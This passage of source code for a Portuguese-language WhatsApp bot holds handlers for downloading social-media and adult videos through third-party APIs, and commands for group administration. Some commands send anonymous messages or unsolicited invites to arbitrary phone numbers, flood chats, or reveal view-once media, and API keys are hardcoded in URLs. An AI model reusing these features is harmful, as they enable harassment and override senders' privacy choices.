reply(" deu erro na solicita√ß√£o ")
}
break;


case 'playdl':
if(!q) return reply(`Exemplo: ${prefix}playdl nome da m√∫sica audio ou ${prefix}playdl nome do video v√≠deo`);

const partes = q.trim().split(" ");
const tipo = partes.pop().toLowerCase();
const musica = partes.join(" ");

if (!tipo || (tipo !== "audio" && tipo !== "video")) {
return reply(`Por favor, escolha entre "√°udio" ou "v√≠deo" ap√≥s o nome da m√∫sica. Exemplo: ${prefix}playdl nome da m√∫sica audio ou ${prefix}playdl nome do v√≠deo video.`);
}
//feito por Crician JS, nao tire os cr√©ditos.. 
try {

let api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${encodeURIComponent(musica)}`);

if(tipo === "audio") {
reply(`Baixando o ${tipo} para voc√™, aguarde um pouquinho...`);

await amy.sendMessage(from,
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp3?url=${api.resultado[0].url}` },
mimetype: "audio/mpeg",
},
{quoted: info }).catch(e => {
console.error(e);
reply("Ocorreu um erro ao reply a m√∫sica.");
});
        
} else if (tipo === "video") {
reply(`Baixando o ${tipo} para voc√™, aguarde um pouquinho...`);

await amy.sendMessage(from,
{video: 
{url:`https://api.cariflex.xyz/api/downloads/youtube/mp4?url=${api.resultado[0].url}`},
mimetype: "video/mp4",
},
{quoted: info }).catch(e => {
console.error(e);
reply("Ocorreu um erro ao reply o v√≠deo.");
});
}

} catch (e) {
console.error(e);
return reply("Ocorreu um erro ao buscar a m√∫sica. Tente novamente mais tarde.");
}
break;

case 'tiktokmp4':
case 'Tiktokmp4':

try {

reagir(from, "üÜô")

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/tiktok/mp4?url=${q}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;

case 'tiktokmp3':
case 'Tiktokmp3':

try {

reagir(from, "üÜô") 

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`)

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/tiktok/mp3?url=${q}`},
mimetype: "audio/mpeg"},
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;

case 'tiktok_video':
case 'tiktokvideo':

try {

reagir(from, "üÜô")

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

let api = await fetchJson(`https://api.cariflex.xyz/api/downloads/tiktok/url?url=${q}`)

await amy.sendMessage(from, 
{video:
{url:`${api.resultado.url}`}, 
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break;

case 'tiktok_audio':
case 'tiktokaudio':
try {

reagir(from, "üÜô") 

if(!q.includes("tiktok")) return reply(`${prefix+command} link do Tiktok`);

let api = await fetchJson(`https://api.cariflex.xyz/api/downloads/tiktok/url?url=${q}`)

await amy.sendMessage(from, 
{audio: 
{url:`${api.resultado.url}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'instamp3':

try {

if(!q) return reply("adicione o link de Instagram para baixar") 

reagir(from, "üÜô")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/instagram/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'instagram2':
case 'instavideo2':
case 'instafoto2':
  try {
    if (!q) {
      return amy.sendMessage(from, { text: 'Digite o link' }, { quoted: info });
    }
    const resp = await instagramDl(q);
    console.log(resp)
    const mediaLinks = [...resp.video, ...resp.foto];
    for (const link of mediaLinks) {
      try {
        const { data, headers } = await axios.get(link, { responseType: 'arraybuffer' });
        const contentType = headers['content-type'];
        if (contentType.startsWith('image/')) {
        await amy.sendMessage(from, { image: data }, { quoted: info });
        } else {
          await amy.sendMessage(from, { video: data }, { quoted: info });
        }
      } catch (err) {
        console.error('Erro ao baixar ou reply m√≠dia:', err);
      }
    }
  } catch (e) {
    console.error('Erro ao processar a solicita√ß√£o:', e);
    await amy.sendMessage(from, { text: e}, { quoted: info });
  }
  break;
  
case 'instadl':
reagir(from, "üíó")
if(!q) return reply(`Coloque o link do Instagram`);

api = await getBuffer(`https://api.cariflex.xyz/api/instagram/dl?url=${q}&apikey=cariflex-key`)

await amy.sendMessage(from, 
{video: 
{url:`${api.url}`}, 
mimetype: "video/mp4"}, 
{quoted: info}).catch(e => {
console.log(e)
reagir(from, "‚ùå")
})
break

case 'instamp4':

try {

reagir(from, "üíó")

if(!q) return reply(`Coloque o link do Instagram`);

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/instagram/mp4?url=${q}`}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'pintemp3':

try {

if(!q) return reply("adicione o link de pinterest para baixar")

reagir(from, "üÜô")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/pinterest/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'pintemp4':

try {

if(!q) return reply("adicione o link de pinterest para baixar")

reagir(from, "üÜô")

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/downloads/pinterest/mp4?url=${q}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'facemp4':

try {

if(!q) return reply("adicione o link de Facebook para baixar")

reagir(from, "üÜô")

await amy.sendMessage(from, 
{video: 
{url:`https://api.cariflex.xyz/api/donwloads/facebook/mp4?url=${q}`},
mimetype: "video/mp4"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break

case 'facemp3':

try {

if(!q) return reply("adicione o link de Facebook para baixar")

reagir(from, "üÜô")

await amy.sendMessage(from, 
{audio: 
{url:`https://api.cariflex.xyz/api/downloads/facebook/mp3?url=${q}`}, 
mimetype: "audio/mpeg"}, 
{quoted: info})

} catch (error) {
console.log(error)
reply(" deu erro na solicita√ß√£o ")
}
break




case 'playmix':
if(!q) return reply(`informe o titulo da m√∫sica`)
reagir(from, "üÜô")
api = await fetchJson(`https://api.cariflex.xyz/youtube/pesquisar?q=${q}`)
capimg = await getBuffer(api.resultado[0].image)
bla = `üíñ‚É§  AMY BOT - DOWNLOAD  - MIX  üíñ‚É§ 
üåπ‚É§ ‚û≥ ùöÉùô∏ùöÉùöÑùôªùôæ ‚ßΩ: ${api.resultado[0].title}
üëÅ‚É§ ‚û≥ ùöÖùô∏ùô¥ùöÜùöÇ ‚ßΩ ${api.resultado[0].views}
‚è∞‚É§ ‚û≥ ùöÉùô¥ùôºùôøùôæ ‚ßΩ ${api.resultado[0].timestamp}
üíñ‚É§ ‚û≥ ùô≥ùô¥ùöÇùô≤ùöÅùô∏ùô≤Ãßùô∞ÃÉùôæ ${api.resultado[0].description}
0:00 ‚îÅ‚ùç‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ< ${api.resultado[0].seconds}`
amy.sendMessage(from,  {image: capimg, caption: bla}, {quoted: info})
await sleep(100);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[0].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(1000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[1].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(2000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[2].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
await sleep(3000);
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/youtube/mp3?url=${api.resultado[3].url}` }, mimetype: "audio/mpeg"}, {quoted: info});
break


case 'Spotify2': case 'spotify2':
reagir(from, "üÜô")
if(!q) return reply(`Exemplo: ${prefix}Spotify nome da m√∫sica`)
api = await fetchJson(`https://api.cariflex.xyz/api/spotifysearch?query=${q}`)
bla = ` üåπ ‚û≥ ùöÉùô∏ùöÉùöÑùôªùôæ ‚ßΩ: ${api.tracksArray[0].title}
üëÅ ‚û≥ ùô∏ùô≥ ‚ßΩ ${api.tracksArray[0].id}
‚è∞ ‚û≥ ùöÉùô¥ùôºùôøùôæ ‚ßΩ ${api.tracksArray[0].duration}
0:00 ‚îÅ‚ùç‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ< ${api.tracksArray[0].duration} ‚Üª ‚ä≤ ‚Ö° ‚ä≥ ‚Ü∫ VOLUME:`
await amy.sendMessage(from,{image:{url: `${api.tracksArray[0].thumb}`}, caption: bla},{quoted: info})
await amy.sendMessage(from, {audio: {url:`https://api.cariflex.xyz/api/downloads/spotify/dl?url=${api.tracksArray[0].url}`}, mimetype: "audio/mpeg"}, {quoted: info}).catch(e => {
reagir(from, "‚ùå")
})
break

case 'Spotify': case 'spotify':
setTimeout(() => {reagir(from, "üÜô")}, 300)
try {
if(!q) return reply(`${prefix+command} nome da m√∫sica`)
api = await fetchJson(`https://api.cariflex.xyz/api/spotifysearch?query=${q}`)
await amy.sendMessage(from, {audio: {url: `https://api.cariflex.xyz/api/downloads/spotify/dl?url=${api.tracksArray[0].url}`}, fileName: api.tracksArray[0].title+'.m4a', mimetype: "audio/mpeg", contextInfo: {
externalAdReply: {
title: api.tracksArray[0].title,
body: `0:00 ‚îÅ‚ùç‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ-${api.tracksArray[0].duration || "indefinido"} ‚Üª ‚ä≤ ‚Ö° ‚ä≥ ‚Ü∫`,
mediaType: 1,
reviewType: "PHOTO", 
thumbnailUrl: api.tracksArray[0].thumb,
showAdAttribution: true,
renderLargerThumbnail: true,
}}}, {quoted: info}).catch(e => {
reagir(from, "‚ùå") 
})
} catch (e) {
reagir(from,"‚ùå") 
}

break;

case 'download-link':
reagir(from, "üÜô") 
if(q.includes("video") || q.includes("mp4")) {
amy.sendMessage(from, {video: {url: q}, mimetype: 'video/mp4'}, {quoted: info}).catch(e => {
reply("Erro, visualize se este link √© v√°lido...")
})
} else if(q.includes("webp") || q.includes("jpg")) {
amy.sendMessage(from, {image: {url: q}}, {quoted: info}).catch(e => {
reagir(from, "‚ùå")
})
}
break

case 'face_video':
try {
if(!q) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
reagir(from, "üÜô")
const facev = await fetchJson(`https://tohsaka.tech/download/facebook?query=${q}&apitoken=xReis`)
amy.sendMessage(from, {video: {url: `https://api.cafirexos.com/api/facebook?url${facev.resultado[0].down_link}`}, mimetype: "video/mp4"}, { quoted: info})
} catch (erro) {
reagir(from, "‚ùå")
console.log(erro)
}
break

case 'face_audio':
try {
reagir(from, "üÜô")
if(!q) return reply(`Exemplo: ${prefix+command} o link do Facebook`);
const facea = await fetchJson(`https://tohsaka.tech/download/facebook?query=${q}&apitoken=
xReis`)
amy.sendMessage(from, {audio: {url: `https://api.cafirexos.com/api/facebook?url${facea.resultado[0].down_link}`}, mimetype: "audio/mpeg"}).catch(e => {
reagir(from, "‚ùå")
})
} catch (e) {
reagir(from, "‚ùå")
}
break;

case 'capcut': case 'capcutmodel':
if(!q) return reply('Por favor, adicione um link de um modelo do CapCut.')
try {
reagir(from, "üÜô")
data = await fetchJson(`https://yoshinofenixbots.online/api/dl/capcut?url=${q}&apikey=SHIPPUDEN`) 
c = await getBuffer(data.resultado.videoOriginal)
amy.sendMessage(from, {video: c, caption: `‚Ä¢ *${data.resultado.title} | ${data.resultado.fullUse}*\n‚Ä¢ *Desc:* ${data.resultado.description}`}, {quoted: info})
} catch(e) {
reagir(from, "‚ùå")
}
break

case 'Srcxvideos':
case 'srcxvideo':

if(!q) return reply('Por favor, informe o t√≠tulo do video.')

let apii = await fetchJson(`https://api.cariflex.xyz/api/downloads/xvideos/dl?query=${q}`);

await amy.sendMessage(sender, 
{video: 
{url: `${apii.videoUrl}`},
mimetype: 'video/mp4'}, 
{quoted: info}).catch(e => {
reply("Erro ao baixar seu v√≠deo!")  
})
break

case 'multidl': case 'pocbi':
if(q.length < 5) return reply('Por favor, adicione um link de uma rede social de m√≠dia. (Ex.: Tiktok, insta, threads, etc...)');
try {
setTimeout(() => {reagir(from, "üòâ")}, 100)
data = await MultiDownload(q)
console.log(data)
for (let i = 0; i < data.medias.length; i++) {
let dmt = data.medias[i].extension
mimety = dmt === "mp4" ? "video/mp4" : dmt === "webp" ? "image/webp" : dmt === "jpg" ? "image/jpeg" : dmt === "mp3" ? "audio/mpeg" : "video/mp4"
amy.sendMessage(from, {[mimety.split("/")[0]]: {url: data.medias[i].url}, mimetype: mimety}, {quoted: info})
}
} catch(e) {
return reply(mess.error())
}
break

case 'module':
if(!q) return reply("coloque um link")
reply("pegando informa√ß√µes do m√≥dulo")
let module = await MultiDownload(q)
await reply(module)
break

case 'Srcpornhub':
case 'srcpornhub':
if (!q) return reply('Por favor, informe o t√≠tulo do v√≠deo.');

try {
let pornhub = await fetchJson(`https://api.cariflex.xyz/api/pesquisa/pornhubsrc?q=${q}`);
reply("Baixando o v√≠deo solicitado...");
await amy.sendMessage(sender, 
{ 
document: { url: `https://api.cariflex.xyz/api/downloads/pornhub/dl?url=${pornhub.resultado[0].link}` }, 
mimetype: 'video/mp4', 
fileName: `${pornhub.resultado[0].titulo}.mp4` 
}, 
{quoted: info });
} catch (e) {
console.error(e);
reply("Erro ao baixar ou enviar seu v√≠deo!");  
}
break;

//‚åó PARTE DE ADMINISTRA√á√ÉO DO BOT ‚åó
case 'idgp':
if(!isAdmins) return reply(reply.msg.adm)
reply(`${from}`)
break

case 'linkgp':
case 'linkgroup':
setTimeout(() => {reagir(from, `üÜô`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
await sleep(1000)
linkgc = await amy.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'limpar':
setTimeout(() => {reagir(from, "üóëÔ∏è")}, 300)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
clear = `„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§
\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§
Ô∏è`
clear2 = `„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
reply(`*GRUPO FECHADO PARA LIMPEZA* üóëÔ∏è`)
amy.groupSettingUpdate(from, 'announcement')
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 1000)//msg 1
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 4000)//msg 2
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 7000)//msg 3
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 10000)// msg 4
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 13000)//msg 5
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 16000)//msg 6
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 19000)//msg 7
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 22000)//msg 8
setTimeout(async() => {
amy.sendMessage(from, {text: clear})
}, 25000)//msg 9
setTimeout(async() => {
amy.sendMessage(from, {text: clear2})
}, 28000)//msg 10
setTimeout(async() => {
amy.sendMessage(from, {text: `*LIMPEZA CONCLU√çDA* ‚úÖ`})
amy.groupSettingUpdate(from, 'not_announcement')
}, 30000)
break

case 'limpar2':
setTimeout(() => {reagir(from, "üóëÔ∏è")}, 300)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
clearcmd = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
amy.sendMessage(from, {text: clearcmd}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
break

case 'recrutar':
setTimeout(() => {reagir(from, `üì©`)}, 100)
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(!q) return reply("ùòæùôñùôôùôöÃÇ ùô§ ùô£ùô™ÃÅùô¢ùôöùôßùô§ ùôôùô§ ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô¶ùô™ùôö ùô´ùô§ùôòùôöÃÇ ùôôùôöùô®ùôöùôüùôñ ùôòùô§ùô£ùô´ùôûùôôùôñùôß.")
try {
photoG = await amy.profilePictureUrl(from, 'image')
} catch {
photoG = thumbnail
}
rcrt = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
linkgc = await amy.groupInviteCode(from)
amy.sendMessage(rcrt, {text: "ùôäùô°ùôñÃÅ, ùô©ùô™ùôôùô§ ùôóùôöùô¢? ùôëùô§ùôòùôöÃÇ ùôõùô§ùôû ùôòùô§ùô£ùô´ùôûùôôùôñùôôùô§(ùôñ) ùô•ùôöùô°ùô§(ùôñ) ùôñùôôùô¢ùôûùô£ùô®ùô©ùôßùôñùôôùô§ùôß(ùôñ) ùôôùô§ ùôúùôßùô™ùô•ùô§,ùôãùôñùôßùôñ ùô•ùôñùôßùô©ùôûùôòùôûùô•ùôñùôß ùôôùô§ ùô£ùô§ùô®ùô®ùô§ ùôúùôßùô™ùô•ùô§,ùô´ùôöùô£ùôùùôñ ùô®ùôö ùôôùôûùô´ùôöùôßùô©ùôûùôß ü•∞.\nùôãùôñùôßùôñ ùôöùô£ùô©ùôßùôñùôß ùô£ùô§ ùôúùôßùô™ùô•ùô§, ùôòùô°ùôûùô¶ùô™ùôö ùôñùôòùôûùô¢ùôñ!", contextInfo: {externalAdReply: {title: "ùòæùô°ùôûùô¶ùô™ùôö ùôñùô¶ùô™ùôû ùô•ùôñùôßùôñ ùô•ùôñùôßùô©ùôûùôòùôûùô•ùôñùôß ùôôùô§ ùôúùôßùô™ùô•ùô§ üíû.", thumbnail: await getBuffer(photoG), mediaType: 1, sourceUrl: "https://chat.whatsapp.com/"+linkgc}}})
reply("ùòæùô§ùô£ùô´ùôûùô©ùôö ùôôùôö ùôßùôöùôòùôßùô™ùô©ùôñùô¢ùôöùô£ùô©ùô§ ùôôùô§ ùô™ùô®ùô™ùôñÃÅùôßùôûùô§, ùôõùô§ùôû ùôöùô£ùô´ùôûùôñùôôùô§ ùô•ùôñùôßùôñ ùô§ ùô•ùôßùôûùô´ùôñùôôùô§ ùôôùôöùô°ùôö ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ‚úÖ")
break

case 'correio': {
reagir(from, "üíå")
if (!args.join(" ")) return reply(`ùóòùòÖùó≤ùó∫ùóΩùóπùóº :\n${prefix + command} 559691542453|ùóºùó∂ùó≤ùóµ, ùòÅùòÇùó±ùóº ùóØùó≤ùó∫ ?`)
const cpes = args.join(" ")
const nony = cpes.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `       *| üíå ùó†ùó¶ùóö ùóñùó¢ùó•ùó•ùóòùóúùó¢ ùóîùó†ùó¨ üíå |*

‚Ä¢ ‚ä± ·¥ç·¥á…¥s·¥Ä…¢·¥á·¥ç ·¥Ä…¥·¥èÃÇ…¥…™·¥ç·¥Ä ‚ä∞
‚Äã
‚Ä¢ ·¥ç·¥á…¥s·¥Ä…¢·¥á·¥ç : _[ ${pesny} ]_ `
amy.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[sender]}, {quoted: live})
}
await reply("ùó†ùó≤ùóªùòÄùóÆùó¥ùó≤ùó∫ ùó≤ùóªùòÉùó∂ùóÆùó±ùóÆ ùó∞ùóºùó∫ ùòÄùòÇùó∞ùó≤ùòÄùòÄùóº üíå")
break

case 'x9visuunica':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(args.length < 1) return reply(' 1 ùô•ùôßùôñ ùô°ùôûùôúùôñùôß / 0 ùô•ùôßùôñ ùôôùôöùô®ùô°ùôûùôúùôñùôß üë©üèª‚Äçüíª')
if(Number(args[0]) === 1) {
if(isX9VisuUnica) return reply(' ùôä ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùôüùôñÃÅ ùôöùô®ùô©ùôñÃÅ ùôñùô©ùôûùô´ùôñùôôùô§ üë©üèª‚Äçüíª')
dataGp[0].visuUnica = true
setGp(dataGp)
setTimeout(() => {reagir(from, `üë©üèª‚Äçüíª`)}, 50)
reply('ùòºùô©ùôûùô´ùô§ùô™ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ùô§ ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùô£ùôöùô®ùô©ùôö ùôúùôßùô™ùô•ùô§ ‚úÖ')
} else if(Number(args[0]) === 0) {
if(!isX9VisuUnica) return reply('ùôä ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùôüùôñÃÅ ùôöùô®ùô©ùôñÃÅ ùôôùôöùô®ùôñùô©ùôûùô´ùôñùôôùô§ üë©üèª‚Äçüíª.')
dataGp[0].visuUnica = false
setGp(dataGp)
setTimeout(() => {reagir(from, `‚ùå`)}, 50)
reply(' ùòøùôöùô®ùôñùô©ùôûùô´ùô§ùô™ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ùô§ ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùô£ùôöùô®ùô©ùôö ùôúùôßùô™ùô•ùô§ ‚úÖ')
} else {
reply(' 1 ùô•ùôñùôßùôñ ùôñùô©ùôûùô´ùôñùôß, 0 ùô•ùôñùôßùôñ ùôôùôöùô®ùôñùô©ùôûùô´ùôñùôß üë©üèª‚Äçüíª')
}
break

case 'advertir':
case 'adv':
case 'adverter': 
if(!isGroup) return reply(reply.msg.grupo)
if(!isAdmins) return reply(reply.msg.adm)
if(menc_os2 == numeroBot) return reply("‚ùïùôâùôñÃÉùô§ ùô•ùô§ùôôùôö ùôñùôôùô´ùôöùôßùô©ùôûùôß ùô§ ùô•ùôßùô§ÃÅùô•ùôßùôûùô§ ùôóùô§ùô© ùô®ùôöùô™ ùôóùôñùôûùô©ùô§ùô°ùôñ üòë");
if(menc_os2 == donoNumber) return reply("‚ùïùôâùôñÃÉùô§ ùô•ùô§ùôôùôö ùôñùôôùô´ùôöùôßùô©ùôûùôß ùô§ ùô•ùôßùô§ÃÅùô•ùôßùôûùô§ ùôôùô§ùô£ùô§ ùôôùô§ ùôóùô§ùô© üòë");
if(groupAdmins.includes(menc_os2)) return reply("‚ùïùôâùôñÃÉùô§ √© ùô•ùô§ùô®ùô®ùôûÃÅùô´ùôöùô° ùôñùôôùô´ùôöùôßùô©ùôûùôß ùôñùôôùô¢ùôûùô£ùô®ùô©ùôßùôñùôôùô§ùôß ùôôùô§ ùôúùôßùô™ùô•ùô§ ùô®ùôöùô™ ùô°ùô§ùô™ùôòùô§(ùôñ) .");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("‚ùïùôâùôñÃÉùô§ ùô©ùôöùô¢ ùôòùô§ùô¢ùô§ ùôñùôôùô´ùôöùôßùô©ùôûùôß ùô™ùô¢ ùô™ùô®ùô™ùôñÃÅùôßùôûùô§ ùô¶ùô™ùôö ùô£ùôñÃÉùô§ ùô®ùôö ùôöùô£ùôòùô§ùô£ùô©ùôßùôñ ùô¢ùôñùôûùô® ùô£ùô§ ùôúùôßùô™ùô•ùô§.")
reagir(from, "üë©üèª‚Äçüíª")
await sleep(1000)
ADVT.push(menc_os2); setGp(dataGp)  
setTimeout(async() => {
var dfqn = ADVT.filter(x => x == menc_os2).length
var dfntxt = `ùôäùô°ùôñÃÅ @${menc_os2.split("@")[0]} - ùó©ùóºùó∞ùó≤ ùóøùó≤ùó∞ùó≤ùóØùó≤ùòÇ ùòÇùó∫ùóÆ ùóÆùó±ùòÉùó≤ùóøùòÅùó≤ÃÇùóªùó∞ùó∂ùóÆ ùóΩùóºùóø ùó∫ùóºùòÅùó∂ùòÉùóºùòÄ ùó∑ùòÇùòÄùòÅùóº ${dfqn}/3, ùô©ùô§ùô¢ùôö ùôòùô™ùôûùôôùôñùôôùô§ ùôòùô§ùô¢ 3 ùôñùôôùô´ùôöùôßùô©ùôöÃÇùô£ùôòùôûùôñùô® ùóøùó≤ùòÄùòÇùóπùòÅùóÆùóøùóÆÃÅ ùó≤ùó∫ ùòÄùòÇùóÆ ùóøùó≤ùó∫ùóºùó∞ÃßùóÆÃÉùóº ùó±ùóº ùó¥ùóøùòÇùóΩùóº!`
if(!dfntxt.includes("3/3")) {
if(!JSON.stringify(ADVT).includes(sender)) {
await sleep(1500); mentions(dfntxt, [menc_os2])
} else if(dfqn == 2) {
await sleep(1500); mentions(dfntxt, [menc_os2])
